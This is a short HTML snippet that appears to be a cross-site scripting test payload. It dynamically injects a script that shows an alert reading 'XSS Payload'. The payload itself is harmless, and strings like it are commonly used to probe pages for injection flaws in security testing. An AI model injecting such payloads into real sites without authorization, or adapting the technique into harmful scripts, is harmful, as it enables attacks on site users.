<script>
var script = document.createElement('script');
script.innerHTML = `alert("XSS Payload");`;
document.body.appendChild(script);
</script>
